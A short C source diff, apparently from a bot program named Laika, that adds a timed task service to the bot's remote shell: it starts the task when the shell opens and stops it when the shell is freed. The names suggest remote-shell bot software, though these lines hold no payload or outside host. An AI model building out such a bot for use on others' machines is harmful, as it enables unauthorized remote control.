@@ -9,6 +9,7 @@
 
 #include "lerror.h"
 #include "lmem.h"
+#include "ltask.h"
 #include "bot.h"
 #include "shell.h"
 
@@ -37,6 +38,9 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows)
         LAIKA_ERROR("Failed to set shell fd O_NONBLOCK");
     }
 
+    /* start shell task */
+    bot->shellTask = laikaT_newTask(&bot->tService, LAIKA_SHELL_TASK_DELTA, laikaB_shellTask, (void*)bot);
+
     return shell;
 }
 
@@ -47,6 +51,10 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
 
     bot->shell = NULL;
     laikaM_free(shell);
+
+    /* stop shell task */
+    laikaT_delTask(&bot->tService, bot->shellTask);
+    bot->shellTask = NULL;
 }
 
 bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
